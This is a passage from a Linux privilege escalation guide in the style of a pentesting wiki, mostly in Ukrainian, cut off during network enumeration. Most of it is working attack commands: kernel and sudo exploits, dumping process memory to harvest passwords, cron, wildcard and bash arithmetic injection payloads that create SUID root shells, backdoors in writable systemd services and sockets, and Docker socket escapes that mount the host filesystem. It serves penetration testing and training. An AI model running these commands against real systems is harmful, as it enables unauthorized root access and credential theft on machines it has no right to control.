# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Інформація про систему

### Інформація про OS

Почнемо збирати інформацію про запущену OS
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Якщо ви **маєте права запису в будь-яку папку всередині `PATH`** змінної, ви можете перехопити деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Env info

Чи є в змінних середовища цікава інформація, паролі або API-ключі?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel і чи існує exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Тут можна знайти хороший список вразливих ядер і деякі вже **compiled exploits**: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) та [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де можна знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі вразливі версії ядра з цього сайту, можна зробити:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти у пошуку kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (запустити IN victim, перевіряє лише exploits для kernel 2.x)

Завжди **шукайте kernel version у Google**, можливо ваша kernel version зазначена в якомусь kernel exploit і тоді ви будете впевнені, що цей exploit дійсний.

Додаткова техніка kernel exploitation:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo версія

На основі вразливих версій sudo, що наведені в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи вразлива версія sudo за допомогою цього grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Версії Sudo до 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) дозволяють непривілейованим локальним користувачам підвищити привілеї до root через опцію sudo `--chroot`, якщо файл `/etc/nsswitch.conf` використовується з директорії, контрольованої користувачем.

Ось [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) для експлуатації цієї [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перед запуском експлойту переконайтеся, що ваша версія `sudo` вразлива і що вона підтримує функцію `chroot`.

Для додаткової інформації зверніться до оригінального [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: перевірка підпису не пройшла

Перегляньте **smasher2 box of HTB** для **прикладу** того, як цей vuln може бути exploited
```bash
dmesg 2>/dev/null | grep "signature"
```
### Додаткова системна розвідка
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічити можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви перебуваєте всередині docker container, ви можете спробувати вийти з нього:


{{#ref}}
docker-security/
{{#endref}}

## Диски

Перевірте **що змонтовано і розмонтовано**, де і чому. Якщо щось розмонтовано, ви можете спробувати змонтувати його і перевірити на наявність приватної інформації
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічіть корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлено **будь-який компілятор**. Це корисно, якщо вам потрібно використати якийсь kernel exploit, оскільки рекомендується компілювати його на машині, де ви збираєтеся його використовувати (або на схожій).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів та сервісів**. Можливо, є якась стара версія Nagios (наприклад), яку можна експлуатувати для підвищення привілеїв…\
Рекомендується вручну перевірити версії найбільш підозрілих встановлених програм.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є доступ по SSH до машини, ви також можете використати **openVAS** для перевірки застарілого і вразливого програмного забезпечення, встановленого на машині.

> [!NOTE] > _Зверніть увагу, що ці команди покажуть багато інформації, яка здебільшого буде марною, тому рекомендовано використовувати такі програми, як OpenVAS або подібні, які перевіряють, чи будь-яка встановлена версія програмного забезпечення вразлива до відомих exploits_

## Процеси

Перегляньте, **які процеси** виконуються, і перевірте, чи якийсь процес не має **більше привілеїв, ніж повинен** (наприклад, tomcat виконується від імені root?)
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте, чи працюють [**electron/cef/chromium debuggers** — їх можна використати для ескалації привілеїв](electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` в командному рядку процесу.\  
Також **перевірте свої привілеї щодо бінарних файлів процесів**, можливо, ви зможете перезаписати їх.

### Моніторинг процесів

Можна використовувати інструменти на кшталт [**pspy**](https://github.com/DominicBreuker/pspy) для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, які виконуються часто або коли виконано певні умови.

### Пам'ять процесу

Деякі сервіси сервера зберігають **credentials у відкритому тексті в пам'яті**.\  
Зазвичай вам потрібні **root privileges** щоб читати пам'ять процесів, що належать іншим користувачам, тому це зазвичай більш корисно, коли ви вже root і хочете знайти більше credentials.\  
Однак пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, які належать вам**.

> [!WARNING]
> Зверніть увагу, що наразі більшість машин **за замовчуванням не дозволяють ptrace**, що означає, що ви не можете знімати дамп інших процесів, які належать вашому непривілейованому користувачу.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: всі процеси можуть бути відлагоджені, якщо вони мають однаковий uid. Це класичний спосіб, як працював ptrace.
> - **kernel.yama.ptrace_scope = 1**: тільки батьківський процес може бути відлагоджений.
> - **kernel.yama.ptrace_scope = 2**: Тільки admin може використовувати ptrace, оскільки це вимагає CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: Жодні процеси не можуть бути трасовані через ptrace. Після встановлення потрібне перезавантаження, щоб знову дозволити ptrace.

#### GDB

Якщо ви маєте доступ до пам'яті служби FTP (наприклад), ви можете отримати Heap і шукати в ньому credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB скрипт
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу, **maps показують, як пам'ять відображається у** віртуальному адресному просторі цього процесу; вони також показують **права доступу кожного відображеного регіону**. Псевдофайл **mem** **надає доступ до самої пам'яті процесу**. З файлу **maps** ми знаємо, які **області пам'яті доступні для читання** та їхні зсуви. Ми використовуємо цю інформацію, щоб **перейти до файлу mem і здампити всі області, доступні для читання**, у файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам'яті системи, а не до віртуальної пам'яті. Віртуальний простір адрес ядра можна отримати за допомогою /dev/kmem.\
Зазвичай `/dev/mem` доступний лише для читання користувачеві **root** та групі **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для linux

ProcDump — це реалізація для Linux класичного інструмента ProcDump із набору утиліт Sysinternals для Windows. Отримати можна за адресою [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб зробити дамп пам'яті процесу, ви можете використовувати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну зняти вимоги root і зробити дамп процесу, яким ви володієте
- Script A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущений:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете dump the process (див. попередні розділи, щоб знайти різні способи dump the memory of a process) і шукати credentials всередині memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **викрадати clear text credentials з memory** та з деяких **well known files**. Для правильної роботи вимагає root privileges.

| Функція                                           | Назва процесу         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regex-пошук/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Cron jobs

### Crontab UI (alseambusher) запущений як root – web-based scheduler privesc

Якщо веб-панель “Crontab UI” (alseambusher/crontab-ui) працює як root і прив'язана тільки до loopback, до неї все ще можна дістатися через SSH local port-forwarding і створити привілейовану задачу для escalate.

Типовий ланцюг
- Виявити порт, доступний лише на loopback (наприклад, 127.0.0.1:8000) і Basic-Auth realm за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти облікові дані в операційних артефактах:
  - Резервні копії/скрипти з `zip -P <password>`
  - systemd unit, що експонує `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Тунелювання та вхід:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створіть high-priv job і запустіть негайно (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використовуйте це:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Не запускайте Crontab UI від імені root; обмежте доступ спеціальним user з мінімальними permissions
- Прив'язуйте до localhost і додатково обмежуйте доступ через firewall/VPN; не використовуйте повторно passwords
- Уникайте вбудовування secrets у unit files; використовуйте secret stores або root-only EnvironmentFile
- Увімкніть audit/logging для on-demand job executions

Перевірте, чи якийсь scheduled job вразливий. Можливо, ви зможете скористатися скриптом, що виконується від імені root (wildcard vuln? чи можна змінити файли, які використовує root? use symlinks? створити певні файли в директорії, яку використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Наприклад, всередині _/etc/crontab_ можна знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права запису у /home/user_)

Якщо всередині цього crontab користувач root намагається виконати якусь команду або скрипт, не встановивши PATH. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати root shell, використавши:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, що використовує скрипт із wildcard (Wildcard Injection)

Якщо скрипт, що виконується від імені root, має “**\***” всередині команди, ви можете скористатися цим, щоб спричинити непередбачувані наслідки (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard передує шляху на кшталт** _**/some/path/\***_ **, він не вразливий (навіть** _**./\***_ **не вразливий).**

Прочитайте наступну сторінку для додаткових wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash спочатку виконує розширення параметрів та підстановку команд перед арифметичною оцінкою в ((...)), $((...)) та let. Якщо root cron/parser читає недовірені поля журналу і передає їх у арифметичний контекст, атакуючий може вставити підстановку команд $(...), яка виконається з правами root під час запуску cron.

- Чому це працює: у Bash розширення відбуваються в такому порядку: розширення параметрів/змінних, підстановка команд, арифметичне розширення, потім розбиття слів і розширення шляхів. Тому значення на кшталт `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (виконуючи команду), а залишкова цифра `0` використовується в арифметиці, тож скрипт продовжує роботу без помилок.

- Типовий вразливий шаблон:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Експлуатація: домогіться, щоб у розбираємий лог записався текст, керований атакуючим, так що поле, що виглядає як число, містить підстановку команд і закінчується цифрою. Переконайтеся, що ваша команда не виводить у stdout (або перенаправте її), щоб арифметика залишалася валідною.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Якщо ви **можете змінити cron script**, що виконується під root, ви дуже легко отримаєте shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо script, що виконується під root, використовує **directory, де ви маєте повний доступ**, можливо варто видалити цю folder і **створити symlink folder на іншу**, яка містить script під вашим контролем.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Часті cron jobs

Ви можете моніторити процеси, щоб шукати процеси, які виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і escalate privileges.

Наприклад, щоб **моніторити кожні 0.1s протягом 1 хвилини**, **відсортувати за найменш виконуваними командами** та видалити команди, які виконувалися найчастіше, ви можете виконати:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (воно буде моніторити та перелічувати кожен процес, який запускається).

### Невидимі cron jobs

Можна створити cronjob **вставивши символ повернення каретки після коментаря** (без символу нового рядка), і cron job працюватиме. Приклад (зверніть увагу на символ повернення каретки):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Служби

### Файли _.service_, доступні для запису

Перевірте, чи можете ви записати будь-який `.service` файл, якщо можете, ви **можете змінити його** так, щоб він **виконував** ваш **backdoor коли** служба **запускається**, **перезапускається** або **зупиняється** (можливо, вам доведеться почекати, поки машина не перезавантажиться).\
Наприклад створіть ваш backdoor всередині .service файлу з **`ExecStart=/tmp/script.sh`**

### Бінарні файли сервісів, доступні для запису

Майте на увазі, що якщо ви маєте **права на запис для бінарних файлів, які виконуються службами**, ви можете змінити їх на backdoors так, що коли служби будуть повторно виконані, backdoors будуть виконані.

### systemd PATH - Relative Paths

Ви можете подивитися PATH, який використовується **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **write** в будь-якій із папок шляху, ви можете бути в змозі **escalate privileges**. Потрібно шукати **relative paths being used on service configurations** у файлах, наприклад:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **executable** з **same name as the relative path binary** всередині папки PATH systemd, у яку ви маєте права запису, і коли сервіс буде запитано виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor will be executed** (непривілейовані користувачі зазвичай не можуть start/stop services, але перевірте, чи можете ви використати `sudo -l`).

**Learn more about services with `man systemd.service`.**

## **Таймери**

**Таймери** — це systemd unit файли, ім'я яких закінчується на `**.timer**`, які керують `**.service**` файлами або подіями. **Таймери** можна використовувати як альтернативу cron, оскільки вони мають вбудовану підтримку календарних подій та монотонних подій часу і можуть виконуватися асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Таймери з правом запису

Якщо ви можете змінити таймер, ви можете змусити його виконати деякі існуючі одиниці systemd.unit (наприклад, `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> Unit, який потрібно активувати, коли цей timer спливає. Аргумент — це unit name, суфікс якого не є ".timer". Якщо не вказано, це значення за замовчуванням відповідає service, що має те саме ім'я, що й timer unit, за винятком суфіксу. (Див. вище.) Рекомендується, щоб ім'я unit, який активується, і ім'я timer unit називалися однаково, за винятком суфіксу.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь systemd unit (наприклад, `.service`), який **виконує бінарний файл, доступний для запису**
- Знайти якийсь systemd unit, який **виконує відносний шлях**, і над яким у вас є **права запису** у **systemd PATH** (щоб підмінити цей виконуваний файл)

**Дізнайтеся більше про timer за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути timer, потрібні права root і потрібно виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Зверніть увагу, **timer** **активується** шляхом створення символічного посилання на нього в `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) дозволяють **взаємодію процесів** на тих самих або різних машинах у моделях client-server. Вони використовують стандартні Unix descriptor файли для міжкомп’ютерної комунікації і налаштовуються через `.socket` файли.

Sockets можна налаштовувати за допомогою `.socket` файлів.

**Дізнайтеся більше про sockets за допомогою `man systemd.socket`.** У цьому файлі можна налаштувати декілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції різні, але загалом використовуються для **вказання, де буде прослуховуватися** сокет (шлях AF_UNIX socket файлу, IPv4/6 і/або номер порту для прослуховування тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, для **кожного вхідного з’єднання створюється інстанс service** і передається лише сокет з’єднання. Якщо **false**, усі прослуховувані сокети **передаються запущеному service unit**, і створюється лише один service unit для всіх з’єднань. Це значення ігнорується для datagram сокетів і FIFO, де один service unit безумовно обробляє весь вхідний трафік. **За замовчуванням — false**. З міркувань продуктивності рекомендується писати нові демони у спосіб, придатний для `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають один або декілька рядків команд, які **виконуються перед** або **після** створення та прив’язки прослуховуваних **sockets**/FIFO відповідно. Першим токеном рядка команди має бути абсолютне ім’я файлу, після чого слідують аргументи для процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються перед** або **після** закриття та видалення прослуховуваних **sockets**/FIFO відповідно.
- `Service`: Вказує ім’я unit **service**, яке потрібно **активувати** при **вхідному трафіку**. Ця опція дозволена лише для sockets з Accept=no. За замовчуванням використовується service з тим самим ім’ям, що і socket (із заміненим суфіксом). У більшості випадків використання цієї опції не є необхідним.

### Writable .socket files

Якщо ви знайдете **доступний для запису** `.socket` файл, ви можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor` і backdoor буде виконано до створення сокета. Тому, **ймовірно, доведеться дочекатися перезавантаження машини.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Якщо ви **виявите будь-який доступний для запису socket** (_тепер мова про Unix Sockets, а не про конфігураційні `.socket` файли_), то **ви можете спілкуватися** з цим socket і, можливо, експлуатувати вразливість.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Сире з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зверніть увагу, що можуть бути деякі **sockets listening for HTTP** requests (_я не говорю про .socket files, а про файли, які виступають як unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **відповідає на HTTP** request, then you can **спілкуватися** with it and maybe **exploit some vulnerability**.

### Доступний для запису Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to Privilege Escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити контейнер з root-доступом до файлової системи хоста.

#### **Використання Docker API безпосередньо**

У випадках, коли Docker CLI недоступний, Docker socket все ще можна керувати за допомогою Docker API та команд `curl`.

1.  **List Docker Images:** Отримати список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надіслати запит на створення контейнера, який примонтує кореневий каталог хост-системи.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть щойно створений контейнер:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat` для встановлення з'єднання з контейнером, що дозволить виконувати команди всередині нього.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після налаштування з'єднання через `socat` ви можете виконувати команди безпосередньо в контейнері з root-доступом до файлової системи хоста.

### Інше

Зверніть увагу, що якщо у вас є права на запис у docker socket через те, що ви належите до групи `docker`, у вас є [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перегляньте **more ways to break out from docker or abuse it to escalate privileges** у:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви виявите, що можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви виявите, що можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це розвинена система міжпроцесної комунікації (IPC), яка дозволяє додаткам ефективно взаємодіяти та обмінюватися даними. Розроблена з урахуванням сучасної системи Linux, вона пропонує надійну основу для різних форм взаємодії між додатками.

Система універсальна: вона підтримує базовий IPC, що покращує обмін даними між процесами, нагадуючи розширені UNIX domain sockets. Крім того, вона допомагає транслювати події або сигнали, сприяючи безшовній інтеграції компонентів системи. Наприклад, сигнал від Bluetooth-демона про вхідний виклик може змусити музичний програвач приглушити звук. Також D-Bus підтримує систему віддалених об’єктів, спрощуючи запити сервісів і виклики методів між додатками, оптимізуючи процеси, які раніше були складними.

D-Bus працює за моделлю allow/deny, керуючи дозволами на повідомлення (виклики методів, емісія сигналів тощо) на основі кумулятивного ефекту співпадаючих правил політик. Ці політики визначають взаємодію з шиною, що потенційно може призвести до privilege escalation через експлуатацію цих дозволів.

Наводиться приклад такої політики у `/etc/dbus-1/system.d/wpa_supplicant.conf`, що детально описує дозволи для користувача root володіти, надсилати та отримувати повідомлення від `fi.w1.wpa_supplicant1`.

Політики без зазначеного користувача або групи застосовуються універсально, тоді як політики в контексті "default" застосовуються до всіх, хто не покритий іншими специфічними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як enumerate та exploit D-Bus communication тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Завжди цікаво enumerate the network і з'ясувати позицію машини.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
